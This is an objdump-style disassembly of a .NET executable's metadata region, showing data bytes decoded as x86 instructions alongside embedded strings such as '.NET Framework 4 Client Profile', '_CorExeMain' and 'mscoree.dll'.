  40c0d5:	14 46                	adc    $0x46,%al
  40c0d7:	72 61                	jb     0x40c13a
  40c0d9:	6d                   	insl   (%dx),%es:(%edi)
  40c0da:	65 77 6f             	gs ja  0x40c14c
  40c0dd:	72 6b                	jb     0x40c14a
  40c0df:	44                   	inc    %esp
  40c0e0:	69 73 70 6c 61 79 4e 	imul   $0x4e79616c,0x70(%ebx),%esi
  40c0e7:	61                   	popa
  40c0e8:	6d                   	insl   (%dx),%es:(%edi)
  40c0e9:	65 1f                	gs pop %ds
  40c0eb:	2e 4e                	cs dec %esi
  40c0ed:	45                   	inc    %ebp
  40c0ee:	54                   	push   %esp
  40c0ef:	20 46 72             	and    %al,0x72(%esi)
  40c0f2:	61                   	popa
  40c0f3:	6d                   	insl   (%dx),%es:(%edi)
  40c0f4:	65 77 6f             	gs ja  0x40c166
  40c0f7:	72 6b                	jb     0x40c164
  40c0f9:	20 34 20             	and    %dh,(%eax,%eiz,1)
  40c0fc:	43                   	inc    %ebx
  40c0fd:	6c                   	insb   (%dx),%es:(%edi)
  40c0fe:	69 65 6e 74 20 50 72 	imul   $0x72502074,0x6e(%ebp),%esp
  40c105:	6f                   	outsl  %ds:(%esi),(%dx)
  40c106:	66 69 6c 65 09 01 00 	imul   $0x1,0x9(%ebp,%eiz,2),%bp
  40c10d:	04 49                	add    $0x49,%al
  40c10f:	74 65                	je     0x40c176
  40c111:	6d                   	insl   (%dx),%es:(%edi)
  40c112:	00 00                	add    %al,(%eax)
  40c114:	03 07                	add    (%edi),%eax
  40c116:	01 08                	add    %ecx,(%eax)
  40c118:	04 00                	add    $0x0,%al
  40c11a:	01 08                	add    %ecx,(%eax)
  40c11c:	0e                   	push   %cs
  40c11d:	03 07                	add    (%edi),%eax
  40c11f:	01 02                	add    %eax,(%edx)
  40c121:	05 00 00 12 80       	add    $0x80120000,%eax
  40c126:	b1 05                	mov    $0x5,%cl
  40c128:	20 01                	and    %al,(%ecx)
  40c12a:	0e                   	push   %cs
  40c12b:	1d 05 05 20 00       	sbb    $0x200505,%eax
  40c130:	12 80 b5 05 20 00    	adc    0x2005b5(%eax),%al
  40c136:	12 80 b9 05 20 01    	adc    0x12005b9(%eax),%al
  40c13c:	1d 05 0e 08 20       	sbb    $0x20080e05,%eax
  40c141:	03 02                	add    (%edx),%eax
  40c143:	1d 05 0e 1d 05       	sbb    $0x51d0e05,%eax
  40c148:	14 07                	adc    $0x7,%al
  40c14a:	08 0e                	or     %cl,(%esi)
  40c14c:	08 1d 12 80 c9 08    	or     %bl,0x8c98012
  40c152:	12 80 c9 12 80 cd    	adc    -0x327fed37(%eax),%al
  40c158:	12 80 d1 1d 0e 0c    	adc    0xc0e1dd1(%eax),%al
  40c15e:	20 03                	and    %al,(%ebx)
  40c160:	01 11                	add    %edx,(%ecx)
  40c162:	80 d5 11             	adc    $0x11,%ch
  40c165:	80 d9 11             	sbb    $0x11,%cl
  40c168:	80 dd 05             	sbb    $0x5,%ch
  40c16b:	00 02                	add    %al,(%edx)
  40c16d:	02 0e                	add    (%esi),%cl
  40c16f:	0e                   	push   %cs
  40c170:	06                   	push   %es
  40c171:	20 01                	and    %al,(%ecx)
  40c173:	1d 0e 1d 03 04       	sbb    $0x4031d0e,%eax
  40c178:	20 01                	and    %al,(%ecx)
  40c17a:	08 08                	or     %cl,(%eax)
  40c17c:	07                   	pop    %es
  40c17d:	00 01                	add    %al,(%ecx)
  40c17f:	1d 12 80 c9 0e       	sbb    $0xec98012,%eax
  40c184:	07                   	pop    %es
  40c185:	20 02                	and    %al,(%edx)
  40c187:	01 12                	add    %edx,(%edx)
  40c189:	80 c9 08             	or     $0x8,%cl
  40c18c:	06                   	push   %es
  40c18d:	20 01                	and    %al,(%ecx)
  40c18f:	01 12                	add    %edx,(%edx)
  40c191:	80 f1 09             	xor    $0x9,%cl
  40c194:	20 02                	and    %al,(%edx)
  40c196:	1d 0e 1d 0e 11       	sbb    $0x110e1d0e,%eax
  40c19b:	80 f5 05             	xor    $0x5,%ch
  40c19e:	20 02                	and    %al,(%edx)
  40c1a0:	08 08                	or     %cl,(%eax)
  40c1a2:	08 06                	or     %al,(%esi)
  40c1a4:	20 02                	and    %al,(%edx)
  40c1a6:	01 12                	add    %edx,(%edx)
  40c1a8:	0d 02 05 20 02       	or     $0x2200502,%eax
  40c1ad:	01 1c 18             	add    %ebx,(%eax,%ebx,1)
  40c1b0:	09 20                	or     %esp,(%eax)
  40c1b2:	03 01                	add    (%ecx),%eax
  40c1b4:	12 61 02             	adc    0x2(%ecx),%ah
  40c1b7:	12 81 01 05 20 00    	adc    0x200501(%ecx),%al
  40c1bd:	12 81 05 0b 20 04    	adc    0x4200b05(%ecx),%al
  40c1c3:	01 0e                	add    %ecx,(%esi)
  40c1c5:	12 81 09 11 81 0d    	adc    0xd811109(%ecx),%al
  40c1cb:	02 09                	add    (%ecx),%cl
  40c1cd:	20 04 01             	and    %al,(%ecx,%eax,1)
  40c1d0:	12 81 15 1c 08 08    	adc    0x8081c15(%ecx),%al
  40c1d6:	0c 20                	or     $0x20,%al
  40c1d8:	05 12 25 1d 05       	add    $0x51d2512,%eax
  40c1dd:	08 08                	or     %cl,(%eax)
  40c1df:	12 81 19 1c 06 00    	adc    0x61c19(%ecx),%al
  40c1e5:	01 11                	add    %edx,(%ecx)
  40c1e7:	81 21 0e 05 20 01    	andl   $0x120050e,(%ecx)
  40c1ed:	02 12                	add    (%edx),%dl
  40c1ef:	19 04 07             	sbb    %eax,(%edi,%eax,1)
  40c1f2:	02 08                	add    (%eax),%cl
  40c1f4:	08 05 20 01 08 12    	or     %al,0x12080120
  40c1fa:	25 06 00 02 08       	and    $0x8020006,%eax
  40c1ff:	1d 05 08 07 20       	sbb    $0x20070805,%eax
  40c204:	03 08                	add    (%eax),%ecx
  40c206:	1d 05 08 08 06       	sbb    $0x6080805,%eax
  40c20b:	20 01                	and    %al,(%ecx)
  40c20d:	01 12                	add    %edx,(%edx)
  40c20f:	81 29 04 20 01 01    	subl   $0x1012004,(%ecx)
  40c215:	1c 0c                	sbb    $0xc,%al
  40c217:	07                   	pop    %es
  40c218:	06                   	push   %es
  40c219:	1c 02                	sbb    $0x2,%al
  40c21b:	1d 05 12 81 2d       	sbb    $0x2d811205,%eax
  40c220:	08 1d 05 06 00 02    	or     %bl,0x2000605
  40c226:	01 1c 10             	add    %ebx,(%eax,%edx,1)
  40c229:	02 07                	add    (%edi),%al
  40c22b:	20 02                	and    %al,(%edx)
  40c22d:	02 08                	add    (%eax),%cl
  40c22f:	11 81 35 07 20 03    	adc    %eax,0x3200735(%ecx)
  40c235:	01 1d 05 08 08 1a    	add    %ebx,0x1a080805
  40c23b:	07                   	pop    %es
  40c23c:	0a 12                	or     (%edx),%dl
  40c23e:	81 3d 0e 1d 12 81 41 	cmpl   $0x81120841,0x81121d0e
  40c245:	08 12 81 
  40c248:	41                   	inc    %ecx
  40c249:	12 81 45 12 81 49    	adc    0x49811245(%ecx),%al
  40c24f:	1d 05 0e 12 81       	sbb    $0x81120e05,%eax
  40c254:	4d                   	dec    %ebp
  40c255:	05 00 02 0e 0e       	add    $0xe0e0200,%eax
  40c25a:	0e                   	push   %cs
  40c25b:	05 00 00 12 81       	add    $0x81120000,%eax
  40c260:	41                   	inc    %ecx
  40c261:	05 20 00 12 81       	add    $0x81120020,%eax
  40c266:	55                   	push   %ebp
  40c267:	06                   	push   %es
  40c268:	00 00                	add    %al,(%eax)
  40c26a:	1d 12 81 41 05       	sbb    $0x5418112,%eax
  40c26f:	00 01                	add    %al,(%ecx)
  40c271:	0e                   	push   %cs
  40c272:	1d 0e 06 20 01       	sbb    $0x120060e,%eax
  40c277:	01 11                	add    %edx,(%ecx)
  40c279:	81 5d 08 00 01 12 81 	sbbl   $0x81120100,0x8(%ebp)
  40c280:	41                   	inc    %ecx
  40c281:	12 81 45 04 06 12    	adc    0x12060445(%ecx),%al
  40c287:	81 49 09 20 02 12 81 	orl    $0x81120220,0x9(%ecx)
  40c28e:	49                   	dec    %ecx
  40c28f:	0e                   	push   %cs
  40c290:	11 81 69 06 00 03    	adc    %eax,0x3000669(%ecx)
  40c296:	0e                   	push   %cs
  40c297:	0e                   	push   %cs
  40c298:	0e                   	push   %cs
  40c299:	0e                   	push   %cs
  40c29a:	05 20 02 01 0e       	add    $0xe010220,%eax
  40c29f:	1c 07                	sbb    $0x7,%al
  40c2a1:	20 02                	and    %al,(%edx)
  40c2a3:	01 0e                	add    %ecx,(%esi)
  40c2a5:	11 81 75 04 07 02    	adc    %eax,0x2070475(%ecx)
  40c2ab:	0a 02                	or     (%edx),%al
  40c2ad:	10 07                	adc    %al,(%edi)
  40c2af:	06                   	push   %es
  40c2b0:	12 81 85 12 81 89    	adc    -0x767eed7b(%ecx),%al
  40c2b6:	12 81 8d 12 81 91    	adc    -0x6e7eed73(%ecx),%al
  40c2bc:	0e                   	push   %cs
  40c2bd:	02 05 20 00 12 81    	add    0x81120020,%al
  40c2c3:	89 05 20 00 12 81    	mov    %eax,0x81120020
  40c2c9:	8d 05 20 00 12 81    	lea    0x81120020,%eax
  40c2cf:	91                   	xchg   %eax,%ecx
  40c2d0:	04 20                	add    $0x20,%al
  40c2d2:	01 1c 0e             	add    %ebx,(%esi,%ecx,1)
  40c2d5:	04 07                	add    $0x7,%al
  40c2d7:	02 02                	add    (%edx),%al
  40c2d9:	02 03                	add    (%ebx),%al
  40c2db:	20 00                	and    %al,(%eax)
  40c2dd:	18 04 07             	sbb    %al,(%edi,%eax,1)
  40c2e0:	02 18                	add    (%eax),%bl
  40c2e2:	02 03                	add    (%ebx),%al
  40c2e4:	07                   	pop    %es
  40c2e5:	01 0e                	add    %ecx,(%esi)
  40c2e7:	05 00 00 12 81       	add    $0x81120000,%eax
  40c2ec:	9d                   	popf
  40c2ed:	05 00 01 0e 1d       	add    $0x1d0e0100,%eax
  40c2f2:	1c 0a                	sbb    $0xa,%al
  40c2f4:	07                   	pop    %es
  40c2f5:	05 1d 05 12 35       	add    $0x3512051d,%eax
  40c2fa:	1d 05 08 05 05       	sbb    $0x5050805,%eax
  40c2ff:	20 01                	and    %al,(%ecx)
  40c301:	12 35 0e 05 20 02    	adc    0x220050e,%dh
  40c307:	0e                   	push   %cs
  40c308:	08 08                	or     %cl,(%eax)
  40c30a:	06                   	push   %es
  40c30b:	07                   	pop    %es
  40c30c:	02 02                	add    (%edx),%al
  40c30e:	11 81 ad 05 20 02    	adc    %eax,0x22005ad(%ecx)
  40c314:	0e                   	push   %cs
  40c315:	0e                   	push   %cs
  40c316:	0e                   	push   %cs
  40c317:	05 20 00 11 81       	add    $0x81110020,%eax
  40c31c:	ad                   	lods   %ds:(%esi),%eax
  40c31d:	05 00 00 12 81       	add    $0x81120000,%eax
  40c322:	b9 06 20 01 01       	mov    $0x1012006,%ecx
  40c327:	12 81 b9 06 20 01    	adc    0x12006b9(%ecx),%al
  40c32d:	02 11                	add    (%ecx),%dl
  40c32f:	81 c1 11 07 05 12    	add    $0x12050711,%ecx
  40c335:	81 85 15 12 41 01 0e 	addl   $0x8d81120e,0x1411215(%ebp)
  40c33c:	12 81 8d 
  40c33f:	12 81 91 0e 05 15    	adc    0x15050e91(%ecx),%al
  40c345:	12 41 01             	adc    0x1(%ecx),%al
  40c348:	0e                   	push   %cs
  40c349:	05 20 01 01 13       	add    $0x13010120,%eax
  40c34e:	00 05 20 00 1d 13    	add    %al,0x131d0020
  40c354:	00 06                	add    %al,(%esi)
  40c356:	00 02                	add    %al,(%edx)
  40c358:	0e                   	push   %cs
  40c359:	0e                   	push   %cs
  40c35a:	1d 0e 08 07 03       	sbb    $0x307080e,%eax
  40c35f:	1d 12 29 08 12       	sbb    $0x12082912,%eax
  40c364:	29 05 00 00 1d 12    	sub    %eax,0x121d0000
  40c36a:	29 05 20 00 11 81    	sub    %eax,0x81110020
  40c370:	c5 09                	lds    (%ecx),%ecx
  40c372:	00 02                	add    %al,(%edx)
  40c374:	02 11                	add    (%ecx),%dl
  40c376:	81 c5 11 81 c5 05    	add    $0x5c58111,%ebp
  40c37c:	07                   	pop    %es
  40c37d:	02 12                	add    (%edx),%dl
  40c37f:	35 0e 07 20 03       	xor    $0x320070e,%eax
  40c384:	01 02                	add    %eax,(%edx)
  40c386:	0e                   	push   %cs
  40c387:	10 02                	adc    %al,(%edx)
  40c389:	06                   	push   %es
  40c38a:	00 01                	add    %al,(%ecx)
  40c38c:	01 12                	add    %edx,(%edx)
  40c38e:	81 cd 06 07 02 12    	or     $0x12020706,%ebp
  40c394:	81 49 02 08 20 03 01 	orl    $0x1032008,0x2(%ecx)
  40c39b:	0e                   	push   %cs
  40c39c:	1c 11                	sbb    $0x11,%al
  40c39e:	81 d5 07 07 02 12    	adc    $0x12020707,%ebp
  40c3a4:	81 49 1d 05 06 20 01 	orl    $0x1200605,0x1d(%ecx)
  40c3ab:	12 81 49 0e 02 1d    	adc    0x1d020e49(%ecx),%al
  40c3b1:	05 07 20 02 12       	add    $0x12022007,%eax
  40c3b6:	81 49 0e 02 0e 07 04 	orl    $0x4070e02,0xe(%ecx)
  40c3bd:	12 60 0e             	adc    0xe(%eax),%ah
  40c3c0:	15 11 81 d9 01       	adc    $0x1d98111,%eax
  40c3c5:	12 60 12             	adc    0x12(%eax),%ah
  40c3c8:	60                   	pusha
  40c3c9:	06                   	push   %es
  40c3ca:	15 12 41 01 12       	adc    $0x12014112,%eax
  40c3cf:	60                   	pusha
  40c3d0:	10 10                	adc    %dl,(%eax)
  40c3d2:	01 01                	add    %eax,(%ecx)
  40c3d4:	15 12 41 01 1e       	adc    $0x1e014112,%eax
  40c3d9:	00 15 12 81 e1 01    	add    %dl,0x1e18112
  40c3df:	1e                   	push   %ds
  40c3e0:	00 04 0a             	add    %al,(%edx,%ecx,1)
  40c3e3:	01 12                	add    %edx,(%edx)
  40c3e5:	60                   	pusha
  40c3e6:	09 20                	or     %esp,(%eax)
  40c3e8:	00 15 11 81 d9 01    	add    %dl,0x1d98111
  40c3ee:	13 00                	adc    (%eax),%eax
  40c3f0:	07                   	pop    %es
  40c3f1:	15 11 81 d9 01       	adc    $0x1d98111,%eax
  40c3f6:	12 60 04             	adc    0x4(%eax),%ah
  40c3f9:	20 00                	and    %al,(%eax)
  40c3fb:	13 00                	adc    (%eax),%eax
  40c3fd:	05 20 01 02 13       	add    $0x13020120,%eax
  40c402:	00 03                	add    %al,(%ebx)
  40c404:	07                   	pop    %es
  40c405:	01 1c 05 00 00 12 81 	add    %ebx,-0x7eee0000(,%eax,1)
  40c40c:	e5 07                	in     $0x7,%eax
  40c40e:	20 01                	and    %al,(%ecx)
  40c410:	12 81 e9 1d 05 06    	adc    0x6051de9(%ecx),%al
  40c416:	20 01                	and    %al,(%ecx)
  40c418:	12 81 ed 0e 06 00    	adc    0x60eed(%ecx),%al
  40c41e:	01 1c 12             	add    %ebx,(%edx,%edx,1)
  40c421:	81 ed 08 00 01 12    	sub    $0x12010008,%ebp
  40c427:	81 ed 11 81 f5 09    	sub    $0x9f58111,%ebp
  40c42d:	00 02                	add    %al,(%edx)
  40c42f:	12 81 f9 11 81 fd    	adc    -0x27eee07(%ecx),%al
  40c435:	0e                   	push   %cs
  40c436:	1c 00                	sbb    $0x0,%al
  40c438:	05 12 82 05 11       	add    $0x11058212,%eax
  40c43d:	82 09 0e             	orb    $0xe,(%ecx)
  40c440:	15 12 81 e1 01       	adc    $0x1e18112,%eax
  40c445:	12 81 ed 12 81 ed    	adc    -0x127eed13(%ecx),%al
  40c44b:	15 12 81 e1 01       	adc    $0x1e18112,%eax
  40c450:	12 81 f9 17 15 12    	adc    0x121517f9(%ecx),%al
  40c456:	45                   	inc    %ebp
  40c457:	01 15 12 49 0a 12    	add    %edx,0x120a4912
  40c45d:	4d                   	dec    %ebp
  40c45e:	1c 12                	sbb    $0x12,%al
  40c460:	0d 12 09 0e 1d       	or     $0x1d0e0912,%eax
  40c465:	05 12 31 0e 0e       	add    $0xe0e3112,%eax
  40c46a:	0e                   	push   %cs
  40c46b:	0b 00                	or     (%eax),%eax
  40c46d:	01 15 12 45 01 13    	add    %edx,0x13014512
  40c473:	00 12                	add    %dl,(%edx)
  40c475:	82 05 03 06 13 00 13 	addb   $0x13,0x130603
  40c47c:	15 12 49 0a 12       	adc    $0x120a4912,%eax
  40c481:	4d                   	dec    %ebp
  40c482:	1c 12                	sbb    $0x12,%al
  40c484:	0d 12 09 0e 1d       	or     $0x1d0e0912,%eax
  40c489:	05 12 31 0e 0e       	add    $0xe0e3112,%eax
  40c48e:	0e                   	push   %cs
  40c48f:	17                   	pop    %ss
  40c490:	20 0a                	and    %cl,(%edx)
  40c492:	01 13                	add    %edx,(%ebx)
  40c494:	00 13                	add    %dl,(%ebx)
  40c496:	01 13                	add    %edx,(%ebx)
  40c498:	02 13                	add    (%ebx),%dl
  40c49a:	03 13                	add    (%ebx),%edx
  40c49c:	04 13                	add    $0x13,%al
  40c49e:	05 13 06 13 07       	add    $0x7130613,%eax
  40c4a3:	13 08                	adc    (%eax),%ecx
  40c4a5:	13 09                	adc    (%ecx),%ecx
  40c4a7:	05 07 01 12 82       	add    $0x82120107,%eax
  40c4ac:	0d 07 20 03 01       	or     $0x1032007,%eax
  40c4b1:	0e                   	push   %cs
  40c4b2:	1d 05 08 05 20       	sbb    $0x20050805,%eax
  40c4b7:	01 1d 05 08 12 07    	add    %ebx,0x7120805
  40c4bd:	06                   	push   %es
  40c4be:	12 81 2d 12 82 19    	adc    0x1982122d(%ecx),%al
  40c4c4:	12 82 1d 12 82 21    	adc    0x2182121d(%edx),%al
  40c4ca:	1d 05 1d 05 06       	sbb    $0x6051d05,%eax
  40c4cf:	20 01                	and    %al,(%ecx)
  40c4d1:	01 11                	add    %edx,(%ecx)
  40c4d3:	82 2d 06 20 01 01 11 	subb   $0x11,0x1012006
  40c4da:	82 31 05             	xorb   $0x5,(%ecx)
  40c4dd:	20 00                	and    %al,(%eax)
  40c4df:	12 82 35 0b 20 03    	adc    0x3200b35(%edx),%al
  40c4e5:	01 12                	add    %edx,(%edx)
  40c4e7:	61                   	popa
  40c4e8:	12 82 35 11 82 39    	adc    0x39821135(%edx),%al
  40c4ee:	08 20                	or     %ah,(%eax)
  40c4f0:	03 1d 05 1d 05 08    	add    0x8051d05,%ebx
  40c4f6:	08 1a                	or     %bl,(%edx)
  40c4f8:	07                   	pop    %es
  40c4f9:	0a 12                	or     (%edx),%dl
  40c4fb:	81 2d 12 82 19 12 82 	subl   $0x51d2182,0x12198212
  40c502:	21 1d 05 
  40c505:	1d 05 1d 05 12       	sbb    $0x12051d05,%eax
  40c50a:	82 1d 1d 05 1d 05 1d 	sbbb   $0x1d,0x51d051d
  40c511:	05 0c 00 05 01       	add    $0x105000c,%eax
  40c516:	12 82 45 08 12 82    	adc    -0x7dedf7bb(%edx),%al
  40c51c:	45                   	inc    %ebp
  40c51d:	08 08                	or     %cl,(%eax)
  40c51f:	04 07                	add    $0x7,%al
  40c521:	02 02                	add    (%edx),%al
  40c523:	08 09                	or     %cl,(%ecx)
  40c525:	00 02                	add    %al,(%edx)
  40c527:	01 12                	add    %edx,(%edx)
  40c529:	82 45 11 82          	addb   $0x82,0x11(%ebp)
  40c52d:	4d                   	dec    %ebp
  40c52e:	0d 07 06 1d 05       	or     $0x51d0607,%eax
  40c533:	12 82 51 12 35 1d    	adc    0x1d351251(%edx),%al
  40c539:	05 08 05 07 07       	add    $0x7070508,%eax
  40c53e:	02 12                	add    (%edx),%dl
  40c540:	82 51 1d 05          	adcb   $0x5,0x1d(%ecx)
  40c544:	08 07                	or     %al,(%edi)
  40c546:	04 12                	add    $0x12,%al
  40c548:	35 1d 05 08 05       	xor    $0x508051d,%eax
  40c54d:	05 00 02 0e 0e       	add    $0xe0e0200,%eax
  40c552:	1c 06                	sbb    $0x6,%al
  40c554:	07                   	pop    %es
  40c555:	03 1d 05 08 08 05    	add    0x5080805,%ebx
  40c55b:	20 01                	and    %al,(%ecx)
  40c55d:	13 00                	adc    (%eax),%eax
  40c55f:	08 04 07             	or     %al,(%edi,%eax,1)
  40c562:	01 12                	add    %edx,(%edx)
  40c564:	60                   	pusha
  40c565:	0e                   	push   %cs
  40c566:	07                   	pop    %es
  40c567:	05 08 08 0e 15       	add    $0x150e0808,%eax
  40c56c:	11 81 d9 01 12 60    	adc    %eax,0x601201d9(%ecx)
  40c572:	12 60 07             	adc    0x7(%eax),%ah
  40c575:	07                   	pop    %es
  40c576:	04 08                	add    $0x8,%al
  40c578:	05 1d 05 08 04       	add    $0x408051d,%eax
  40c57d:	20 01                	and    %al,(%ecx)
  40c57f:	01 05 04 07 01 11    	add    %eax,0x11010704
  40c585:	64 04 00             	fs add $0x0,%al
  40c588:	01 0b                	add    %ecx,(%ebx)
  40c58a:	0a 04 00             	or     (%eax,%eax,1),%al
  40c58d:	01 0b                	add    %ecx,(%ebx)
  40c58f:	0e                   	push   %cs
  40c590:	04 00                	add    $0x0,%al
  40c592:	01 0b                	add    %ecx,(%ebx)
  40c594:	0d 04 00 01 0b       	or     $0xb010004,%eax
  40c599:	0c 06                	or     $0x6,%al
  40c59b:	00 01                	add    %al,(%ecx)
  40c59d:	0b 11                	or     (%ecx),%edx
  40c59f:	81 ad 04 00 01 0a 0a 	subl   $0x100040a,0xa010004(%ebp)
  40c5a6:	04 00 01 
  40c5a9:	0a 0e                	or     (%esi),%cl
  40c5ab:	04 00                	add    $0x0,%al
  40c5ad:	01 0a                	add    %ecx,(%edx)
  40c5af:	0d 04 00 01 0a       	or     $0xa010004,%eax
  40c5b4:	0c 06                	or     $0x6,%al
  40c5b6:	00 01                	add    %al,(%ecx)
  40c5b8:	0a 11                	or     (%ecx),%dl
  40c5ba:	81 ad 04 00 01 0d 0a 	subl   $0x100040a,0xd010004(%ebp)
  40c5c1:	04 00 01 
  40c5c4:	0d 0e 07 07 02       	or     $0x207070e,%eax
  40c5c9:	11 64 11 81          	adc    %esp,-0x7f(%ecx,%edx,1)
  40c5cd:	ad                   	lods   %ds:(%esi),%eax
  40c5ce:	05 00 01 1d 05       	add    $0x51d0100,%eax
  40c5d3:	0c 07                	or     $0x7,%al
  40c5d5:	07                   	pop    %es
  40c5d6:	02 1d 05 12 81 71    	add    0x71811205,%bl
  40c5dc:	0d 20 04 01 0e       	or     $0xe010420,%eax
  40c5e1:	11 81 75 11 82 61    	adc    %eax,0x61821175(%ecx)
  40c5e7:	11 82 65 0b 07 06    	adc    %eax,0x6070b65(%edx)
  40c5ed:	12 60 1d             	adc    0x1d(%eax),%ah
  40c5f0:	0e                   	push   %cs
  40c5f1:	0e                   	push   %cs
  40c5f2:	08 12                	or     %dl,(%edx)
  40c5f4:	60                   	pusha
  40c5f5:	08 05 07 01 12 81    	or     %al,0x81120107
  40c5fb:	2d 05 07 01 12       	sub    $0x12010705,%eax
  40c600:	81 71 07 07 04 05 1d 	xorl   $0x1d050407,0x7(%ecx)
  40c607:	05 08 08 06 00       	add    $0x60808,%eax
  40c60c:	02 07                	add    (%edi),%al
  40c60e:	1d 05 08 06 00       	sbb    $0x60805,%eax
  40c613:	02 0c 1d 05 08 06 00 	add    0x60805(,%ebx,1),%cl
  40c61a:	02 0d 1d 05 08 06    	add    0x608051d,%cl
  40c620:	00 02                	add    %al,(%edx)
  40c622:	09 1d 05 08 06 00    	or     %ebx,0x60805
  40c628:	02 0b                	add    (%ebx),%cl
  40c62a:	1d 05 08 06 00       	sbb    $0x60805,%eax
  40c62f:	02 06                	add    (%esi),%al
  40c631:	1d 05 08 06 00       	sbb    $0x60805,%eax
  40c636:	02 0a                	add    (%edx),%cl
  40c638:	1d 05 08 09 07       	sbb    $0x7090805,%eax
  40c63d:	03 12                	add    (%edx),%edx
  40c63f:	81 2d 1d 05 1d 05 05 	subl   $0x12020705,0x51d051d
  40c646:	07 02 12 
  40c649:	60                   	pusha
  40c64a:	02 04 07             	add    (%edi,%eax,1),%al
  40c64d:	01 1d 05 05 07 02    	add    %ebx,0x2070505
  40c653:	1d 05 08 08 07       	sbb    $0x7080805,%eax
  40c658:	04 1d                	add    $0x1d,%al
  40c65a:	05 1d 05 08 05       	add    $0x508051d,%eax
  40c65f:	06                   	push   %es
  40c660:	07                   	pop    %es
  40c661:	03 1d 05 08 05 05    	add    0x5050805,%ebx
  40c667:	00 01                	add    %al,(%ecx)
  40c669:	1d 05 0b 0f 07       	sbb    $0x70f0b05,%eax
  40c66e:	06                   	push   %es
  40c66f:	12 81 2d 1d 05 08    	adc    0x8051d2d(%ecx),%al
  40c675:	12 82 69 1d 05 1d    	adc    0x1d051d69(%edx),%al
  40c67b:	05 08 20 02 01       	add    $0x1022008,%eax
  40c680:	12 61 11             	adc    0x11(%ecx),%ah
  40c683:	82 6d 0c 07          	subb   $0x7,0xc(%ebp)
  40c687:	04 12                	add    $0x12,%al
  40c689:	81 2d 1d 05 12 82 69 	subl   $0x51d69,0x8212051d
  40c690:	1d 05 00 
  40c693:	00 bc c6 00 00 00 00 	add    %bh,0x0(%esi,%eax,8)
  40c69a:	00 00                	add    %al,(%eax)
  40c69c:	00 00                	add    %al,(%eax)
  40c69e:	00 00                	add    %al,(%eax)
  40c6a0:	de c6                	faddp  %st,%st(6)
  40c6a2:	00 00                	add    %al,(%eax)
  40c6a4:	00 20                	add    %ah,(%eax)
	...
  40c6ba:	00 00                	add    %al,(%eax)
  40c6bc:	d0 c6                	rol    $1,%dh
	...
  40c6d2:	5f                   	pop    %edi
  40c6d3:	43                   	inc    %ebx
  40c6d4:	6f                   	outsl  %ds:(%esi),(%dx)
  40c6d5:	72 45                	jb     0x40c71c
  40c6d7:	78 65                	js     0x40c73e
  40c6d9:	4d                   	dec    %ebp
  40c6da:	61                   	popa
  40c6db:	69 6e 00 6d 73 63 6f 	imul   $0x6f63736d,0x0(%esi),%ebp
  40c6e2:	72 65                	jb     0x40c749
  40c6e4:	65 2e 64 6c          	gs cs fs insb (%dx),%es:(%edi)
  40c6e8:	6c                   	insb   (%dx),%es:(%edi)
  40c6e9:	00 00                	add    %al,(%eax)
  40c6eb:	00 00                	add    %al,(%eax)
  40c6ed:	00 ff                	add    %bh,%bh
  40c6ef:	25 00 20 40 00       	and    $0x402000,%eax
